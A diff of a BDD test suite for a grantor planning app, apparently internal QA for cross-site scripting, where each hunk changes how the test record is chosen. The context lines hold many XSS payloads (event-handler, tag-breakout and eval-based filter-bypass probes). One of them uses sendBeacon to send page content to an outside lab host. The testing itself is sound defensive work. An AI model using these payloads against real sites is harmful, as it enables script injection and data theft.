-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                           | Field                          |
       | <div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss> | fieldBeneficiaryEligibility__c |
@@ -1723,7 +1723,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                       | Field                          |
       | <xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1748,7 +1748,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                       | Field                          |
       | <div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss> | fieldBeneficiaryEligibility__c |
@@ -1773,7 +1773,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                          |
       | <xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme> | fieldBeneficiaryEligibility__c |
@@ -1798,7 +1798,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                           | Field                          |
       | <video onfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldBeneficiaryEligibility__c |
@@ -1823,7 +1823,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                          |
       | <input oninput=alert(1) value=xss> | fieldBeneficiaryEligibility__c |
@@ -1848,7 +1848,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                        | Field                          |
       | <form><input oninvalid=alert(1) required><input type=submit> | fieldBeneficiaryEligibility__c |
@@ -1874,7 +1874,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                          |
       | <xss onkeydown="alert(1)" contenteditable style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1899,7 +1899,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                          |
       | <xss onkeydown="alert(1)" contenteditable style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1924,7 +1924,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                          |
       | <xss onkeypress="alert(1)" contenteditable style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1949,7 +1949,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                  | Field                          |
       | <xss onkeyup="alert(1)" contenteditable style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1974,7 +1974,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                          |
       | <xss onmousedown="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -1999,7 +1999,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                          |
       | <xss onmouseenter="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -2024,7 +2024,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                          |
       | <xss onmouseleave="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -2049,7 +2049,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                          |
       | <xss onmousemove="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -2074,7 +2074,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                          |
       | <xss onmouseout="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -2099,7 +2099,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                          |
       | <xss onmouseover="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -2124,7 +2124,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                          |
       | <xss onmouseup="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
@@ -2149,7 +2149,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                           | Field                          |
       | <xss onmousewheel=alert(1) style=display:block> | fieldBeneficiaryEligibility__c |
@@ -2174,7 +2174,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                          |
       | <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldBeneficiaryEligibility__c |
@@ -2199,7 +2199,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                          |
       | <body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldBeneficiaryEligibility__c |
@@ -2224,7 +2224,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                          | Field                          |
       | <a onpaste="alert(1)" contenteditable>test</a> | fieldBeneficiaryEligibility__c |
@@ -2249,7 +2249,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                            | Field                          |
       | <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -2274,7 +2274,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                          |
       | <xss onpointerdown=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
@@ -2299,7 +2299,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                          |
       | <xss onpointerenter=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
@@ -2324,7 +2324,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                      | Field                          |
       | <xss onpointerleave=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
@@ -2349,7 +2349,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                          |
       | <xss onpointermove=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
@@ -2374,7 +2374,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                          |
       | <xss onpointerout=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
@@ -2399,7 +2399,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                          |
       | <xss onpointerover=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
@@ -2424,7 +2424,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                          |
       | <xss onpointerrawupdate=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
@@ -2449,7 +2449,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                   | Field                          |
       | <xss onpointerup=alert(1) style=display:block>XSS</xss> | fieldBeneficiaryEligibility__c |
@@ -2474,7 +2474,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                          |
       | <audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -2499,7 +2499,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     And I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    When I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                          |
       | <form onreset=alert(1)><input type=reset> | fieldBeneficiaryEligibility__c |
@@ -2524,7 +2524,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                          |
       | <form><input type=search onsearch=alert(1) value="Hit return" autofocus> | fieldBeneficiaryEligibility__c |
@@ -2549,7 +2549,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                             | Field                          |
       | <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -2575,7 +2575,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                              | Field                          |
       | <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -2600,7 +2600,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                         | Field                          |
       | <input onselect=alert(1) value="XSS" autofocus>  in 'Beneficiary Eligibility' | fieldBeneficiaryEligibility__c |
@@ -2625,7 +2625,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                             | Field                          |
       | <body onselectionchange=alert(1)>select some text | fieldBeneficiaryEligibility__c |
@@ -2650,7 +2650,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                         | Field                          |
       | <body onselectstart=alert(1)>select some text | fieldBeneficiaryEligibility__c |
@@ -2675,7 +2675,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                      | Field                          |
       | <div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div> | fieldBeneficiaryEligibility__c |
@@ -2700,7 +2700,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                       | Field                          |
       | <form onsubmit=alert(1)><input type=submit> | fieldBeneficiaryEligibility__c |
@@ -2725,7 +2725,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                      | Field                          |
       | <body ontouchend=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -2750,7 +2750,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                       | Field                          |
       | <body ontouchmove=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -2775,7 +2775,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                        | Field                          |
       | <body ontouchstart=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -2800,7 +2800,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                   | Field                          |
       | <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
@@ -2825,7 +2825,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                   | Field                          |
       | <body onwheel=alert(1)> | fieldBeneficiaryEligibility__c |
@@ -2850,7 +2850,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                 | Field                          |
       | <noembed><img title="</noembed><img src onerror=alert(1)>"></noembed> | fieldBeneficiaryEligibility__c |
@@ -2875,7 +2875,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                          |
       | <noscript><img title="</noscript><img src onerror=alert(1)>"></noscript> | fieldBeneficiaryEligibility__c |
@@ -2900,7 +2900,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                           | Field                          |
       | <style><img title="</style><img src onerror=alert(1)>"></style> | fieldBeneficiaryEligibility__c |
@@ -2925,7 +2925,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                          |
       | <script><img title="</script><img src onerror=alert(1)>"></script> | fieldBeneficiaryEligibility__c |
@@ -2950,7 +2950,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                          |
       | <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe> | fieldBeneficiaryEligibility__c |
@@ -2975,7 +2975,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                          |
       | <xmp><img title="</xmp><img src onerror=alert(1)>"></xmp> | fieldBeneficiaryEligibility__c |
@@ -3000,7 +3000,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                          |
       | <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea> | fieldBeneficiaryEligibility__c |
@@ -3025,7 +3025,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                          |
       | <noframes><img title="</noframes><img src onerror=alert(1)>"></noframes> | fieldBeneficiaryEligibility__c |
@@ -3050,7 +3050,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                           | Field                          |
       | <title><img title="</title><img src onerror=alert(1)>"></title> | fieldBeneficiaryEligibility__c |
@@ -3075,7 +3075,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                                            | Field                          |
       | <input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script> | fieldBeneficiaryEligibility__c |
@@ -3100,7 +3100,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                  | Field                          |
       | <script>onerror=alert;throw 1</script> | fieldBeneficiaryEligibility__c |
@@ -3125,7 +3125,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                          |
       | <script>{onerror=alert}throw 1</script> | fieldBeneficiaryEligibility__c |
@@ -3150,7 +3150,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                  | Field                          |
       | <script>throw onerror=alert,1</script> | fieldBeneficiaryEligibility__c |
@@ -3175,7 +3175,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                          |
       | <script>throw onerror=eval,'=alert\x281\x29'</script> | fieldBeneficiaryEligibility__c |
@@ -3200,7 +3200,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                          |
       | <script>throw onerror=eval,'alert\x281\x29'</script> | fieldBeneficiaryEligibility__c |
@@ -3225,7 +3225,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                          |
       | <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script> | fieldBeneficiaryEligibility__c |
@@ -3250,7 +3250,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                        | Field                          |
       | <script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script> | fieldBeneficiaryEligibility__c |
@@ -3275,7 +3275,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                     | Field                          |
       | <script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script> | fieldBeneficiaryEligibility__c |
@@ -3300,7 +3300,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                             | Field                          |
       | <script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script> | fieldBeneficiaryEligibility__c |
@@ -3325,7 +3325,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                    | Field                          |
